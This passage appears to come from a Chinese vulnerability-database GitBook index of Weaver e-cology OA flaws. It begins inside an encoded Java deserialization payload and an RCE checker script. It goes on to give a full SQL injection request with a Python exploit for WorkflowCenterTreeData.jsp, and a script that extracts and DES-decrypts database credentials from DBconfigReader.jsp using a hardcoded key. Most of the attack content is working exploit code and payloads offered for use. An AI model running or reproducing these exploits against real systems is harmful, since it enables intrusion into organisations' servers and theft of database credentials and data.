;&#x62;&#x63;&#x65;&#x6c;&#x2e;&#x69;&#x6e;&#x74;&#x65;&#x72;&#x6e;&#x61;&#x6c;&#x2e;&#x75;&#x74;&#x69;&#x6c;&#x2e;&#x43;&#x6c;&#x61;&#x73;&#x73;&#x4c;&#x6f;&#x61;&#x64;&#x65;&#x72;&#x27;&#x20;&#x72;&#x65;&#x66;&#x65;&#x72;&#x65;&#x6e;&#x63;&#x65;&#x3d;&#x27;&#x2e;&#x2e;&#x27;&#x2f;&#x3e;&#x0a;&#x20;&#x20;&#x20;&#x20;&#x20;&#x20;&#x20;&#x20;&#x20;&#x20;&#x20;&#x20;&#x20;&#x20;&#x20;&#x20;&#x20;&#x20;&#x3c;&#x64;&#x65;&#x66;&#x61;&#x75;&#x6c;&#x74;&#x41;&#x73;&#x73;&#x65;&#x72;&#x74;&#x69;&#x6f;&#x6e;&#x53;&#x74;&#x61;&#x74;&#x75;&#x73;&#x3e;&#x66;&#x61;&#x6c;&#x73;&#x65;&#x3c;&#x2f;&#x64;&#x65;&#x66;&#x61;&#x75;&#x6c;&#x74;&#x41;&#x73;&#x73;&#x65;&#x72;&#x74;&#x69;&#x6f;&#x6e;&#x53;&#x74;&#x61;&#x74;&#x75;&#x73;&#x3e;&#x0a;&#x20;&#x20;&#x20;&#x20;&#x20;&#x20;&#x20;&#x20;&#x20;&#x20;&#x20;&#x20;&#x20;&#x20;&#x20;&#x20;&#x20;&#x20;&#x3c;&#x63;&#x6c;&#x61;&#x73;&#x73;&#x65;&#x73;&#x2f;&#x3e;&#x0a;&#x20;&#x20;&#x20;&#x20;&#x20;&#x20;&#x20;&#x20;&#x20;&#x20;&#x20;&#x20;&#x20;&#x20;&#x20;&#x20;&#x20;&#x20;&#x3c;&#x69;&#x67;&#x6e;&#x6f;&#x72;&#x65;&#x64;&#x5f;&#x5f;&#x70;&#x61;&#x63;&#x6b;&#x61;&#x67;&#x65;&#x73;&#x3e;&#x0a;&#x20;&#x20;&#x20;&#x20;&#x20;&#x20;&#x20;&#x20;&#x20;&#x20;&#x20;&#x20;&#x20;&#x20;&#x20;&#x20;&#x20;&#x20;&#x20;&#x20;&#x3c;&#x73;&#x74;&#x72;&#x69;&#x6e;&#x67;&#x3e;&#x6a;&#x61;&#x76;&#x61;&#x2e;&#x3c;&#x2f;&#x73;&#x74;&#x72;&#x69;&#x6e;&#x67;&#x3e;&#x0a;&#x20;&#x20;&#x20;&#x20;&#x20;&#x20;&#x20;&#x20;&#x20;&#x20;&#x20;&#x20;&#x20;&#x20;&#x20;&#x20;&#x20;&#x20;&#x20;&#x20;&#x3c;&#x73;&#x74;&#x72;&#x69;&#x6e;&#x67;&#x3e;&#x6a;&#x61;&#x76;&#x61;&#x78;&#x2e;&#x3c;&#x2f;&#x73;&#x74;&#x72;&#x69;&#x6e;&#x67;&#x3e;&#x0a;&#x20;&#x20;&#x20;&#x20;&#x20;&#x20;&#x20;&#x20;&#x20;&#x20;&#x20;&#x20;&#x20;&#x20;&#x20;&#x20;&#x20;&#x20;&#x20;&#x20;&#x3c;&#x73;&#x74;&#x72;&#x69;&#x6e;&#x67;&#x3e;&#x73;&#x75;&#x6e;&#x2e;&#x3c;&#x2f;&#x73;&#x74;&#x72;&#x69;&#x6e;&#x67;&#x3e;&#x0a;&#x20;&#x20;&#x20;&#x20;&#x20;&#x20;&#x20;&#x20;&#x20;&#x20;&#x20;&#x20;&#x20;&#x20;&#x20;&#x20;&#x20;&#x20;&#x3c;&#x2f;&#x69;&#x67;&#x6e;&#x6f;&#x72;&#x65;&#x64;&#x5f;&#x5f;&#x70;&#x61;&#x63;&#x6b;&#x61;&#x67;&#x65;&#x73;&#x3e;&#x0a;&#x20;&#x20;&#x20;&#x20;&#x20;&#x20;&#x20;&#x20;&#x20;&#x20;&#x20;&#x20;&#x20;&#x20;&#x20;&#x20;&#x20;&#x20;&#x3c;&#x72;&#x65;&#x70;&#x6f;&#x73;&#x69;&#x74;&#x6f;&#x72;&#x79;&#x20;&#x63;&#x6c;&#x61;&#x73;&#x73;&#x3d;&#x27;&#x63;&#x6f;&#x6d;&#x2e;&#x73;&#x75;&#x6e;&#x2e;&#x6f;&#x72;&#x67;&#x2e;&#x61;&#x70;&#x61;&#x63;&#x68;&#x65;&#x2e;&#x62;&#x63;&#x65;&#x6c;&#x2e;&#x69;&#x6e;&#x74;&#x65;&#x72;&#x6e;&#x61;&#x6c;&#x2e;&#x75;&#x74;&#x69;&#x6c;&#x2e;&#x53;&#x79;&#x6e;&#x74;&#x68;&#x65;&#x74;&#x69;&#x63;&#x52;&#x65;&#x70;&#x6f;&#x73;&#x69;&#x74;&#x6f;&#x72;&#x79;&#x27;&#x3e;&#x0a;&#x20;&#x20;&#x20;&#x20;&#x20;&#x20;&#x20;&#x20;&#x20;&#x20;&#x20;&#x20;&#x20;&#x20;&#x20;&#x20;&#x20;&#x20;&#x20;&#x20;&#x3c;&#x5f;&#x5f;&#x70;&#x61;&#x74;&#x68;&#x3e;&#x0a;&#x20;&#x20;&#x20;&#x20;&#x20;&#x20;&#x20;&#x20;&#x20;&#x20;&#x20;&#x20;&#x20;&#x20;&#x20;&#x20;&#x20;&#x20;&#x20;&#x20;&#x20;&#x20;&#x3c;&#x70;&#x61;&#x74;&#x68;&#x73;&#x2f;&#x3e;&#x0a;&#x20;&#x20;&#x20;&#x20;&#x20;&#x20;&#x20;&#x20;&#x20;&#x20;&#x20;&#x20;&#x20;&#x20;&#x20;&#x20;&#x20;&#x20;&#x20;&#x20;&#x20;&#x20;&#x3c;&#x63;&#x6c;&#x61;&#x73;&#x73;&#x5f;&#x5f;&#x70;&#x61;&#x74;&#x68;&#x3e;&#x2e;&#x3c;&#x2f;&#x63;&#x6c;&#x61;&#x73;&#x73;&#x5f;&#x5f;&#x70;&#x61;&#x74;&#x68;&#x3e;&#x0a;&#x20;&#x20;&#x20;&#x20;&#x20;&#x20;&#x20;&#x20;&#x20;&#x20;&#x20;&#x20;&#x20;&#x20;&#x20;&#x20;&#x20;&#x20;&#x20;&#x20;&#x3c;&#x2f;&#x5f;&#x5f;&#x70;&#x61;&#x74;&#x68;&#x3e;&#x0a;&#x20;&#x20;&#x20;&#x20;&#x20;&#x20;&#x20;&#x20;&#x20;&#x20;&#x20;&#x20;&#x20;&#x20;&#x20;&#x20;&#x20;&#x20;&#x20;&#x20;&#x3c;&#x5f;&#x5f;&#x6c;&#x6f;&#x61;&#x64;&#x65;&#x64;&#x43;&#x6c;&#x61;&#x73;&#x73;&#x65;&#x73;&#x2f;&#x3e;&#x0a;&#x20;&#x20;&#x20;&#x20;&#x20;&#x20;&#x20;&#x20;&#x20;&#x20;&#x20;&#x20;&#x20;&#x20;&#x20;&#x20;&#x20;&#x20;&#x3c;&#x2f;&#x72;&#x65;&#x70;&#x6f;&#x73;&#x69;&#x74;&#x6f;&#x72;&#x79;&#x3e;&#x0a;&#x20;&#x20;&#x20;&#x20;&#x20;&#x20;&#x20;&#x20;&#x20;&#x20;&#x20;&#x20;&#x20;&#x20;&#x20;&#x20;&#x20;&#x20;&#x3c;&#x64;&#x65;&#x66;&#x65;&#x72;&#x54;&#x6f;&#x20;&#x63;&#x6c;&#x61;&#x73;&#x73;&#x3d;&#x27;&#x73;&#x75;&#x6e;&#x2e;&#x6d;&#x69;&#x73;&#x63;&#x2e;&#x4c;&#x61;&#x75;&#x6e;&#x63;&#x68;&#x65;&#x72;&#x24;&#x45;&#x78;&#x74;&#x43;&#x6c;&#x61;&#x73;&#x73;&#x4c;&#x6f;&#x61;&#x64;&#x65;&#x72;&#x27;&#x20;&#x72;&#x65;&#x66;&#x65;&#x72;&#x65;&#x6e;&#x63;&#x65;&#x3d;&#x27;&#x2e;&#x2e;&#x2f;&#x70;&#x61;&#x72;&#x65;&#x6e;&#x74;&#x27;&#x2f;&#x3e;&#x0a;&#x20;&#x20;&#x20;&#x20;&#x20;&#x20;&#x20;&#x20;&#x20;&#x20;&#x20;&#x20;&#x20;&#x20;&#x20;&#x20;&#x3c;&#x2f;&#x70;&#x72;&#x6f;&#x63;&#x65;&#x73;&#x73;&#x6f;&#x72;&#x43;&#x4c;&#x3e;&#x0a;&#x20;&#x20;&#x20;&#x20;&#x20;&#x20;&#x20;&#x20;&#x20;&#x20;&#x20;&#x20;&#x20;&#x20;&#x3c;&#x2f;&#x69;&#x74;&#x65;&#x72;&#x61;&#x74;&#x6f;&#x72;&#x3e;&#x0a;&#x20;&#x20;&#x20;&#x20;&#x20;&#x20;&#x20;&#x20;&#x20;&#x20;&#x20;&#x20;&#x20;&#x20;&#x3c;&#x74;&#x79;&#x70;&#x65;&#x3e;&#x4b;&#x45;&#x59;&#x53;&#x3c;&#x2f;&#x74;&#x79;&#x70;&#x65;&#x3e;&#x0a;&#x20;&#x20;&#x20;&#x20;&#x20;&#x20;&#x20;&#x20;&#x20;&#x20;&#x20;&#x20;&#x3c;&#x2f;&#x65;&#x3e;&#x0a;&#x20;&#x20;&#x20;&#x20;&#x20;&#x20;&#x20;&#x20;&#x20;&#x20;&#x20;&#x20;&#x3c;&#x69;&#x6e;&#x20;&#x63;&#x6c;&#x61;&#x73;&#x73;&#x3d;&#x27;&#x6a;&#x61;&#x76;&#x61;&#x2e;&#x69;&#x6f;&#x2e;&#x42;&#x79;&#x74;&#x65;&#x41;&#x72;&#x72;&#x61;&#x79;&#x49;&#x6e;&#x70;&#x75;&#x74;&#x53;&#x74;&#x72;&#x65;&#x61;&#x6d;&#x27;&#x3e;&#x0a;&#x20;&#x20;&#x20;&#x20;&#x20;&#x20;&#x20;&#x20;&#x20;&#x20;&#x20;&#x20;&#x20;&#x20;&#x3c;&#x62;&#x75;&#x66;&#x3e;&#x3c;&#x2f;&#x62;&#x75;&#x66;&#x3e;&#x0a;&#x20;&#x20;&#x20;&#x20;&#x20;&#x20;&#x20;&#x20;&#x20;&#x20;&#x20;&#x20;&#x20;&#x20;&#x3c;&#x70;&#x6f;&#x73;&#x3e;&#x30;&#x3c;&#x2f;&#x70;&#x6f;&#x73;&#x3e;&#x0a;&#x20;&#x20;&#x20;&#x20;&#x20;&#x20;&#x20;&#x20;&#x20;&#x20;&#x20;&#x20;&#x20;&#x20;&#x3c;&#x6d;&#x61;&#x72;&#x6b;&#x3e;&#x30;&#x3c;&#x2f;&#x6d;&#x61;&#x72;&#x6b;&#x3e;&#x0a;&#x20;&#x20;&#x20;&#x20;&#x20;&#x20;&#x20;&#x20;&#x20;&#x20;&#x20;&#x20;&#x20;&#x20;&#x3c;&#x63;&#x6f;&#x75;&#x6e;&#x74;&#x3e;&#x30;&#x3c;&#x2f;&#x63;&#x6f;&#x75;&#x6e;&#x74;&#x3e;&#x0a;&#x20;&#x20;&#x20;&#x20;&#x20;&#x20;&#x20;&#x20;&#x20;&#x20;&#x20;&#x20;&#x3c;&#x2f;&#x69;&#x6e;&#x3e;&#x0a;&#x20;&#x20;&#x20;&#x20;&#x20;&#x20;&#x20;&#x20;&#x20;&#x20;&#x3c;&#x2f;&#x69;&#x73;&#x3e;&#x0a;&#x20;&#x20;&#x20;&#x20;&#x20;&#x20;&#x20;&#x20;&#x20;&#x20;&#x3c;&#x63;&#x6f;&#x6e;&#x73;&#x75;&#x6d;&#x65;&#x64;&#x3e;&#x66;&#x61;&#x6c;&#x73;&#x65;&#x3c;&#x2f;&#x63;&#x6f;&#x6e;&#x73;&#x75;&#x6d;&#x65;&#x64;&#x3e;&#x0a;&#x20;&#x20;&#x20;&#x20;&#x20;&#x20;&#x20;&#x20;&#x3c;&#x2f;&#x64;&#x61;&#x74;&#x61;&#x53;&#x6f;&#x75;&#x72;&#x63;&#x65;&#x3e;&#x0a;&#x20;&#x20;&#x20;&#x20;&#x20;&#x20;&#x20;&#x20;&#x3c;&#x74;&#x72;&#x61;&#x6e;&#x73;&#x66;&#x65;&#x72;&#x46;&#x6c;&#x61;&#x76;&#x6f;&#x72;&#x73;&#x2f;&#x3e;&#x0a;&#x20;&#x20;&#x20;&#x20;&#x20;&#x20;&#x3c;&#x2f;&#x64;&#x61;&#x74;&#x61;&#x48;&#x61;&#x6e;&#x64;&#x6c;&#x65;&#x72;&#x3e;&#x0a;&#x20;&#x20;&#x20;&#x20;&#x20;&#x20;&#x3c;&#x64;&#x61;&#x74;&#x61;&#x4c;&#x65;&#x6e;&#x3e;&#x30;&#x3c;&#x2f;&#x64;&#x61;&#x74;&#x61;&#x4c;&#x65;&#x6e;&#x3e;&#x0a;&#x20;&#x20;&#x20;&#x20;&#x3c;&#x2f;&#x63;&#x6f;&#x6d;&#x2e;&#x73;&#x75;&#x6e;&#x2e;&#x78;&#x6d;&#x6c;&#x2e;&#x69;&#x6e;&#x74;&#x65;&#x72;&#x6e;&#x61;&#x6c;&#x2e;&#x62;&#x69;&#x6e;&#x64;&#x2e;&#x76;&#x32;&#x2e;&#x72;&#x75;&#x6e;&#x74;&#x69;&#x6d;&#x65;&#x2e;&#x75;&#x6e;&#x6d;&#x61;&#x72;&#x73;&#x68;&#x61;&#x6c;&#x6c;&#x65;&#x72;&#x2e;&#x42;&#x61;&#x73;&#x65;&#x36;&#x34;&#x44;&#x61;&#x74;&#x61;&#x3e;&#x0a;&#x20;&#x20;&#x20;&#x20;&#x3c;&#x63;&#x6f;&#x6d;&#x2e;&#x73;&#x75;&#x6e;&#x2e;&#x78;&#x6d;&#x6c;&#x2e;&#x69;&#x6e;&#x74;&#x65;&#x72;&#x6e;&#x61;&#x6c;&#x2e;&#x62;&#x69;&#x6e;&#x64;&#x2e;&#x76;&#x32;&#x2e;&#x72;&#x75;&#x6e;&#x74;&#x69;&#x6d;&#x65;&#x2e;&#x75;&#x6e;&#x6d;&#x61;&#x72;&#x73;&#x68;&#x61;&#x6c;&#x6c;&#x65;&#x72;&#x2e;&#x42;&#x61;&#x73;&#x65;&#x36;&#x34;&#x44;&#x61;&#x74;&#x61;&#x20;&#x72;&#x65;&#x66;&#x65;&#x72;&#x65;&#x6e;&#x63;&#x65;&#x3d;&#x27;&#x2e;&#x2e;&#x2f;&#x63;&#x6f;&#x6d;&#x2e;&#x73;&#x75;&#x6e;&#x2e;&#x78;&#x6d;&#x6c;&#x2e;&#x69;&#x6e;&#x74;&#x65;&#x72;&#x6e;&#x61;&#x6c;&#x2e;&#x62;&#x69;&#x6e;&#x64;&#x2e;&#x76;&#x32;&#x2e;&#x72;&#x75;&#x6e;&#x74;&#x69;&#x6d;&#x65;&#x2e;&#x75;&#x6e;&#x6d;&#x61;&#x72;&#x73;&#x68;&#x61;&#x6c;&#x6c;&#x65;&#x72;&#x2e;&#x42;&#x61;&#x73;&#x65;&#x36;&#x34;&#x44;&#x61;&#x74;&#x61;&#x27;&#x2f;&#x3e;&#x0a;&#x20;&#x20;&#x3c;&#x2f;&#x6a;&#x61;&#x76;&#x61;&#x2e;&#x75;&#x74;&#x69;&#x6c;&#x2e;&#x50;&#x72;&#x69;&#x6f;&#x72;&#x69;&#x74;&#x79;&#x51;&#x75;&#x65;&#x75;&#x65;&#x3e;&#x0a;&#x3c;&#x2f;&#x6a;&#x61;&#x76;&#x61;&#x2e;&#x75;&#x74;&#x69;&#x6c;&#x2e;&#x50;&#x72;&#x69;&#x6f;&#x72;&#x69;&#x74;&#x79;&#x51;&#x75;&#x65;&#x75;&#x65;&#x3e; 2 '''.format(cmd=cmd) try: requests.packages.urllib3.disable_warnings(InsecureRequestWarning) response = requests.post(url=vuln_url, data=data, headers=headers, verify=False, timeout=10) if \"VulTest\" in response.text and response.status_code == 500: print(\"\\033[36m[o] 存在漏洞 \\n[o] 响应为:\\n{} \\033[0m\".format(response.text)) except Exception as e: print(\"\\033[31m[x] 请求失败:{} \\033[0m\".format(e)) sys.exit(0) if __name__ == '__main__': title() target_url = str(input(\"\\033[35mPlease input Attack Url\\nUrl >>> \\033[0m\")) POC_1(target_url) 稻草人安全漏洞库 all right reserved，powered by Gitbook文件更新时间： 2021-07-21 13:48:08 "},"book/OA产品漏洞/泛微OA/泛微OA WorkflowCenterTreeData接口SQL注入.html":{"url":"book/OA产品漏洞/泛微OA/泛微OA WorkflowCenterTreeData接口SQL注入.html","title":"泛微OA WorkflowCenterTreeData接口SQL注入(仅限oracle数据库)","keywords":"","body":"泛微OA WorkflowCenterTreeData接口SQL注入(仅限oracle数据库) CNVD-2019-34241 漏洞描述 2019年10月10日CNVD发布了泛微e-cology OA系统存在SQL注入漏洞。该漏洞是由于OA系统的WorkflowCenterTreeData接口中涉及Oracle数据库的SQL语句缺乏安全检查措施所导致的，任意攻击者都可借SQL语句拼接时机注入恶意payload，造成SQL注入攻击。 影响版本 [!NOTE] 使用Oracle数据库的泛微服务 漏洞复现 泛型微生态OA系统的WorkflowCenterTreeData接口在使用Oracle数据库时，由于内置sql语句分解不严密，导致其存在的sql注入漏洞 漏洞请求包 POST /mobile/browser/WorkflowCenterTreeData.jsp?node=wftype_1&scope=2333 HTTP/1.1 Host: ip:port Cache-Control: max-age=0 Upgrade-Insecure-Requests: 1 User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/74.0.3729.131 Safari/537.36 Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3 Accept-Encoding: gzip, deflate Accept-Language: zh-CN,zh;q=0.9 Cookie: ecology_JSessionId=abc49y8JvMcoqhSkCv02w; testBanCookie=test Connection: close Content-Type: application/x-www-form-urlencoded Content-Length: 2236 Upgrade-Insecure-Requests: 1 formids=11111111111)))%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0dunion select NULL,value from v$parameter order by (((1 漏洞利用POCF import requests import sys headers = { 'User-Agent': 'Mozilla/5.0 (Macintosh; Intel Mac OS X 12_10) AppleWebKit/600.1.25 (KHTML, like Gecko) Version/12.0 Safari/1200.1.25', 'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3', 'Accept-Language': 'zh-CN,zh;q=0.9', 'Content-Type': 'application/x-www-form-urlencoded' } def exploit(url): target=url+'/mobile/browser/WorkflowCenterTreeData.jsp?node=wftype_1&scope=2333' payload=\"formids=11111111111)))%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0dunion select NULL,value from v$parameter order by (((1\" res=requests.post(url=target,data=payload,headers=headers,timeout=10) res.encoding=res.apparent_encoding print(res.text) if __name__ == '__main__': url=sys.argv[1] exploit(url) 参考文章 泛微OA WorkflowCenterTreeData接口注入复现（仅限oracle数据库） 稻草人安全漏洞库 all right reserved，powered by Gitbook文件更新时间： 2021-07-21 13:48:08 "},"book/OA产品漏洞/泛微OA/泛微OA e-cology 数据库配置信息泄漏漏洞.html":{"url":"book/OA产品漏洞/泛微OA/泛微OA e-cology 数据库配置信息泄漏漏洞.html","title":"泛微OA e-cology 数据库配置信息泄漏漏洞","keywords":"","body":"泛微OA e-cology 数据库配置信息泄漏漏洞 漏洞描述 2019年10月24日，360CERT监测到友商发布了泛微e-cology OA数据库配置信息泄漏漏洞预警，漏洞等级中。 攻击者可通过存在漏洞的页面直接获取到数据库配置信息。如果攻击者可直接访问数据库，则可直接获取用户数据，甚至可以直接控制数据库服务器。 360CERT判断漏洞等级为中，危害面/影响面低。建议使用泛微e-cology OA的用户及时安装最新补丁，以免遭受黑客攻击。 影响版本 [!NOTE] 目前已知为8.100.0531,不排除其他版本，包括不限于EC7.0、EC8.0、EC9.0版 漏洞复现 根据源码可以得到DES密钥为 1z2x3c4v5b6n（也有1z2x3c4v的,可以按此规律来爆破） 可以看到会将当前连接数据库的用户名密码，url，logintype等信息进行des加密，并最终进行返回，可以直接通过des解密获取泄露信息。 漏洞利用POC Github链接 python代码 import base64 import requests import ast def req(url): headers = { 'Content-Type':'application/x-www-form-urlencoded', 'User-Agent':'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/63.0.3239.132 Safari/537.36', 'Accept':'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8', } r1 = requests.get(url,headers=headers).content s = r1.replace('\\r\\n','') res1 = base64.b64encode(s) postdata = { 'data':res1, 'type':'des', 'arg':'m=ecb_pad=zero_p=1z2x3c4v_o=0_s=gb2312_t=1' } u = 'http://tool.chacuo.net/cryptdes' r2 = requests.post(u,data=postdata,headers=headers).content res2 = ast.literal_eval(r2) return res2['data'] url = 'http://xxx.xxx.xxx.xxx:8888//mobile/DBconfigReader.jsp' print req(url) 参考文章 [更新]泛微e-cology OA数据库配置信息泄漏漏洞预警 稻草人安全漏洞库 all right reserved，powered by Gitbook文件更新时间： 2021-07-21 13:48:08 "},"book/OA产品漏洞/泛微OA/泛微OA sysinterfacecodeEdit.jsp 页面任意文件上传.html":{"url":"book/OA产品漏洞/泛微OA/泛微OA sysinterfacecodeEdit.jsp 页面任意文件上传.html","title":"泛微OA sysinterfacecodeEdit.jsp 页面任意文件上传","keywords":"","body":"泛微OA sysinterface/codeEdit.jsp 页面任意文件上传 WooYun-2015-0155705 漏洞描述 泛微OA sysinterface/codeEdit.jsp 页面任意文件上传导致可以上传恶意文件 漏洞描述 [!NOTE] 较老版本，目前无准确版本 漏洞复现 